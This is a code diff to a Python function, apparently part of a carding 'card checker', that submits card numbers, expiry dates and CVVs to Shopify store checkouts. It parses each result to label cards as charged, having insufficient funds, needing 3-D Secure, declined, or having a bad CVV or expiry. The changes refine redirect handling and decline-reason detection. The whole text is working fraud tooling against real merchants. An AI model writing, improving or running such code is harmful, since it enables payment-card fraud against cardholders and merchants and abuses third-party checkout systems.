@@ -169,26 +169,40 @@ async def shopify_check(cc, mm, yy, cvv, site):
                 allow_redirects=True,
                 headers={**HEADERS, "Content-Type": "application/x-www-form-urlencoded"}
             ) as resp:
-                result_text = await resp.text()
                 result_url = str(resp.url)
+                result_text = await resp.text()
+
+            # If body empty or en-us redirect, fetch the final URL manually
+            if not result_text.strip() or result_url.endswith("/en-us") or result_url.endswith("/en-US"):
+                async with session.get(result_url, allow_redirects=True) as resp2:
+                    result_url = str(resp2.url)
+                    result_text = await resp2.text()
 
             elapsed = round(time.time() - start, 1)
             result_lower = result_text.lower()
+            result_url_lower = result_url.lower()
 
-            if "thank_you" in result_url or "thank-you" in result_url or "orders" in result_url:
+            if "thank_you" in result_url_lower or "thank-you" in result_url_lower or "orders/" in result_url_lower:
                 return _ok("ORDER_PLACED", gateway, price, "True", "True", elapsed)
-            elif "insufficient" in result_lower:
+            elif "insufficient" in result_lower or "insufficient_funds" in result_lower:
                 return _ok("INSUFFICIENT_FUNDS", gateway, price, "False", "True", elapsed)
-            elif "3d secure" in result_lower or "3ds" in result_lower or "authentication required" in result_lower:
+            elif "3d secure" in result_lower or "3ds" in result_lower or "authentication required" in result_lower or "authenticate" in result_lower:
                 return _ok("3DS_REQUIRED", gateway, price, "False", "False", elapsed)
-            elif "declined" in result_lower or "card was declined" in result_lower:
+            elif "your card was declined" in result_lower or "card_declined" in result_lower or "card has been declined" in result_lower:
                 return _ok("CARD_DECLINED", gateway, price, "False", "False", elapsed)
-            elif "payment" in result_url and "checkouts" in result_url:
+            elif "do_not_honor" in result_lower or "do not honor" in result_lower:
+                return _ok("CARD_DECLINED", gateway, price, "False", "False", elapsed)
+            elif "step=payment_method" in result_url_lower or ("payment" in result_url_lower and "checkouts" in result_url_lower):
+                # Stayed on payment page = declined
+                # Check HTML for specific decline reason
+                if "security code" in result_lower or "cvv" in result_lower:
+                    return _ok("INVALID_CVV", gateway, price, "False", "False", elapsed)
+                elif "expir" in result_lower:
+                    return _ok("INVALID_EXPIRY", gateway, price, "False", "False", elapsed)
                 return _ok("CARD_DECLINED", gateway, price, "False", "False", elapsed)
             else:
-                # Debug: return URL + snippet to understand response
-                snippet = result_text[:200].replace("\n", " ").replace("\r", "")
-                return _ok(f"UNKNOWN|URL:{result_url[:80]}|HTML:{snippet}", gateway, price, "False", "False", elapsed)
+                snippet = result_text[:300].replace("\n", " ").replace("\r", "")
+                return _ok(f"UNKNOWN|URL:{result_url[:100]}|HTML:{snippet[:100]}", gateway, price, "False", "False", elapsed)
 
     except asyncio.TimeoutError:
         return _err("TIMEOUT", start)
